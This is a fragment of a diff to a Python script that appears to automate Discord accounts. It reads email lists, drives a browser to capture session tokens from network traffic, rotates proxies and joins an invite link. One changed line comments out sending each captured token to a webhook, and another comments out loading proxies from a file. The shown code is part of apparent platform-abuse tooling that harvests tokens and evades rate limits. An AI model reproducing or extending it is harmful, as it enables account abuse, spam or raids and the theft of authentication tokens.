@@ -29,7 +29,7 @@ import threading
 import gc
 
 invite = 'https://discord.gg/XDjNdNdG' #
-invite = 'https://discord.gg/csvUVYtT'
+invite = 'https://discord.gg/334xGGKa'
 
 emails = []
 for line in open("emails.txt", "r"):
@@ -225,7 +225,7 @@ class Browser():
                         print(entry['message'])
                         token = json.loads(entry['message'])['message']['params']['response']['payloadData']
                         token = json.loads(token)['d']['token']
-                        webhook.send(f"{token}")
+#                         webhook.send(f"{token}")
                         print(token, type(token))
                         notoken = False
                         # self.driver.quit()
@@ -357,8 +357,8 @@ def run(proxy):
         pass
 proxies = get_proxies()
 proxies = []
-for p in open("proxies.txt", "r"):
-    proxies.append(p.strip("\r\n"))
+# for p in open("proxies.txt", "r"):
+#     proxies.append(p.strip("\r\n"))
 while True:
     if len(proxies) == 0:
         proxies = get_proxies()
